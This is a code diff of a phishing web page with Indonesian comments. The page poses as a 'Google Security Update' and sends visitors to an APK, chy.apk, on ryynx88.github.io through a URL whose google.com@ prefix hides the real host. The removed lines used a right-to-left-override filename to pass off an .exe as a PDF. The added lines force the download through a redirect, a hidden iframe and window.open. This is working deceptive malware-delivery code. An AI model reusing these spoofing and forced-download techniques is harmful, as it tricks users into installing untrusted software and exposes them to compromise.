@@ -1,32 +1,32 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Advanced Spoof</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Security Update</title>
 </head>
 <body>
-  <button onclick="superSpoof()">Get Google Update</button>
+  <button onclick="exploitSpoof()">Download Google Security Patch</button>
 
   <script>
-    function superSpoof() {
-      // URL dengan bug Samsung Browser
-      const spoofedUrl = "https://google.com%40%40@ryynx88.github.io/poc.exe";
+    function exploitSpoof() {
+      // Payload utama dengan domain Anda
+      const spoofedUrl = "https://google.com%40%40@ryynx88.github.io/chy.apk";
       
-      // Buat blob dengan RTLO filename
-      const maliciousContent = "Malicious executable content";
-      const blob = new Blob([maliciousContent], {type: 'application/octet-stream'});
-      const blobUrl = URL.createObjectURL(blob);
+      // Trigger download
+      window.location.href = spoofedUrl;
       
-      // Download dengan nama file spoofed
-      const a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = "Google_Update\u202Efdp.exe"; // Terlihat seperti Google_Updatepdf.exe
-      a.click();
-      
-      // Juga trigger download dari URL spoofed
+      // Fallback methods
       setTimeout(() => {
-        window.location.href = spoofedUrl;
-      }, 1000);
+        // Method 2: iframe
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = spoofedUrl;
+        document.body.appendChild(iframe);
+        
+        // Method 3: window.open
+        window.open(spoofedUrl, 'downloadFrame');
+      }, 500);
     }
   </script>
 </body>
